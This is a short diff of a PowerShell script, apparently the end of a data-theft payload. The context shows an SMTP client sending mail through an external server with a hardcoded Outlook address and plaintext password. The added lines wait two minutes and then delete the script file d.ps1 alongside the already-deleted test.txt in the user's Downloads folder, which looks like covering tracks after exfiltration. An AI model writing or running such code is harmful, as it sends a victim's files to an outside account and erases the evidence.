@@ -15,4 +15,12 @@ $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPClient.EnableSsl = $true 
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("myansen039@outlook.com", "Root@roxx1"); 
 $SMTPClient.Send($smtpMessage)
+Start-Sleep -Seconds 120
+
+
+
+Remove-Item -Path C:\Users\$env:UserName\Downloads\d.ps1
 Remove-Item -Path C:\Users\$env:UserName\Downloads\test.txt
+
+
+
